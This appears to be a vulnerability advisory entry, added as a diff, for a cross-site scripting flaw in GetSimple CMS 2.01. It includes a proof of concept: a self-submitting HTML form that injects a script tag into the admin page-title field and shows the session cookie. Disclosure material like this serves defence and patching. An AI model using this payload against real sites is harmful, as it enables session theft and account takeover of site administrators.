@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43593/info
+
+GetSimple CMS is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+GetSimple CMS 2.01 is vulnerable; prior versions may also be affected.
+
+<form action="http://host/admin/changedata.php" method="post" name="main" > <input type="hidden" name="post-title" value='page title"><script>alert(document.cookie)</script>' /> <input type="hidden" name="post-id" value="test" /> <input type="hidden" name="post-metak" value="" /> <input type="hidden" name="post-metad" value="" /> <input type="hidden" name="post-parent" value="" /> <input type="hidden" name="post-template" value="template.php" /> <input type="hidden" name="post-menu" value="test" /> <input type="hidden" name="post-menu-order" value="" /> <input type="hidden" name="post-content" value="page html" /> <input type="hidden" name="existing-url" value="test" /> <input type="hidden" name="submitted" value="Save Updates" /> </form> <script> document.main.submit(); </script> 
